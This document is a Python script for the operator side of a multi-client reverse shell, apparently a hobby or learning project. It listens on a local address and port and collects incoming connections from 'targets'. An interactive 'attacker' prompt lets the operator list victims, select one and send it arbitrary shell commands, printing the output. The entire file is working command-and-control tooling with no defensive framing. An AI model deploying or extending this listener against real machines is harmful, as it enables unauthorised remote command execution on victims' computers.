#!/usr/local/bin/python3
# !--*--coding:utf-8--*--

import socket
import time
import threading
import sys
import os
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
host = '192.168.1.10'
port = 8090


class Server:
    def __init__(self, _host, _port=8090, _max_client=20):
        # Variables used in this class are here
        self.host = _host
        self.port = _port
        self.max_client = _max_client  # max amount of expected connections
        # once any client connected
        self.all_connection = []  # the connections will be stored here.
        self.all_addresses = []  # the addresses will be stored here.
        self.s = None  # Initialize s socket object
        self.target = ''

    # create socket
    def open_socket(self):
        try:
            self.s = socket.socket()
            self.s.bind((self.host, self.port))
            # listen for one connection :)
            self.s.listen(self.max_client)

        except socket.error as e:
            print("** Oops Something went wrong error code ", e)
            time.sleep(5)  # wait for 5s and try again
            self.open_socket()

    # accept incoming connection
    def accept_connection(self):
        for c in self.all_connection:  # close the connection list
            c.close()
        del self.all_connection[:]  # clean connection list
        del self.all_addresses[:]  # clean addresses list

        while True:
            try:
                conn, address = self.s.accept()
                conn.setblocking(1)
                self.all_connection.append(conn)
                self.all_addresses.append(address)
                print("\n* new Connection has been established from {} on port {}".format(address[0], address[1]))
                print("\n#> ", end="")
            except error as err:
                print("something went wrong while accepting new connection\n error code: {} \n".format(str(err)))

    # Interactive shell for sending command remotely
    def start_attacker(self):
        while True:
            cmd = str(input("#> "))
            cmd = cmd.lower()
            cmd_stripped = cmd.strip()
            if cmd_stripped == 'list':
                self.list_connections()
                continue
            elif cmd_stripped == "help":
                self.displayHelp()
            elif cmd_stripped.startswith("select"):  # check command start with `select` word
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_commands(conn)
            elif cmd_stripped == "quit":
                self.exit()
            elif cmd_stripped == '':
                self.displayHelp()

            else:
                print("`{}` - Command not recognized..".format(cmd))

    # Display the help menu
    def displayHelp(self):
        """Display The help menu"""
        help = "\nlist\t\tList available connections. Usage ( just type : `list`)" \
               "\nselect\t\tSelect a connection to target. Usage (e.g: `select 1`) or change the number 1 to the target ID" \
               "\nquit | exit\tClose the current connection .. or if you don't have one it will close the script" \
               "\nhelp\t\tPrint this menu"
        print('{}'.format(help))

    # Exit Reverse Shell
    def exit(self):
        for c in self.all_connection:
            try:
                c.send(str.encode("end-of-session"))
                c.shutdown(2)
                c.close()
            except Exception as e:
                print('Could not close connection ' + str(e))

        self.s.close()
        print("\n Socket closed")

        # this will be over need but believe me, some times the module refuse to exit..
        # this is why i try each of this method cause at the end one of them should work..
        os._exit(0)
        sys.exit()
        quit(0)
        exit(0)

    # this will display all current connection
    def list_connections(self):
        #		import pdb;pdb.set_trace()
        rs = ''
        for i, conn in enumerate(self.all_connection):  # Enumerate will count number of loop
            try:  # we will test if conn are working..
                conn.send(str.encode('<list_connections>'))  # send blank to test if conn is working.,
                conn.recv(20240)
            except:  # this will ocure if conn is null
                del self.all_connection[i]
                del self.all_addresses[i]
                continue  # go to next loop do not execut the next line..
            rs += str(i) + '\t' + str(self.all_addresses[i][0]) + '\t' + str(self.all_addresses[i][1]) + '\n'

        print("Currently Available Targets")
        print("ID\tIP\t\t\t\tPORT\n" + rs)

    # Select a target client
    def get_target(self, cmd):
        self.target = cmd.replace('select ', '')
        try:
            self.target = int(self.target)
        except:
            print("Target index should be integer.")
            return None
        try:
            conn = self.all_connection[self.target]
        except:
            print("Not a valid connection")
            return None

        print("You are now connected to", self.all_addresses[self.target][0])
        print('{} #> '.format(self.all_addresses[self.target][0]), end="")
        return conn

    # Connect with the target
    def send_commands(self, conn):
        while True:
            try:
                cmd = str(input())
                if cmd == "quit":
                    break
                elif len(cmd) > 0:
                    conn.send(str.encode(cmd))
                    client_response = ''
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response)
                print('{} #> '.format(self.all_addresses[self.target][0]), end="")

            except:
                print("[!] Connection was lost ")
                break
##########################################################################################

# Setting up threads
def setup_threads():
    # Create instance of Server object
    server = Server(host, port)
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True  # It means when the script got closed the thread also will exit from process
        t.start()
    return


# Do the next job in the queue(1: handles connection, other sends commands and get response back)
def work(server):
    while True:
        x = queue.get()
        if x == 1:  # 0: handles connection
            server.open_socket()
            server.accept_connection()
        if x == 2:  # 1: sends commands to target machine
            server.start_attacker()
        queue.task_done()  # [Done] jobs are done with success
    return


# Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    # join attends la fin du thread
    queue.join()
    return


# the main function
def main():
    setup_threads()
    create_jobs()


if __name__ == '__main__':
    main()
